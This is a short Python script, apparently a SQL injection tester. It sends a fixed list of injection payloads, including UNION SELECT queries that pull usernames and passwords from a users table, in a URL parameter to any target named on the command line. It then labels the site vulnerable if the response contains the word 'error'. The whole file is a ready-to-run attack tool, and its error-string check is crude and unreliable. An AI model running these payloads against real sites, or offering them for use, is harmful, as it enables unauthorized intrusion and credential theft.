import requests
import sys

# Array of common SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "' AND 1=1 --",
    "' AND 1=0 UNION SELECT NULL, username, password FROM users --"
]

def test_sql_injection(url, param):
    for payload in payloads:
        # Construct the injection URL
        injection_url = f"{url}?{param}={payload}"
        print(f'Testing: {injection_url}')
        response = requests.get(injection_url)
        if "error" in response.text or "Error" in response.text:
            print(f'Possibly vulnerable: {injection_url}')
        else:
            print(f'Not vulnerable: {injection_url}')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python sql_injection_tester.py <target_url> <parameter_name>")
        sys.exit(1)
    target_url = sys.argv[1]
    parameter_name = sys.argv[2]
    test_sql_injection(target_url, parameter_name)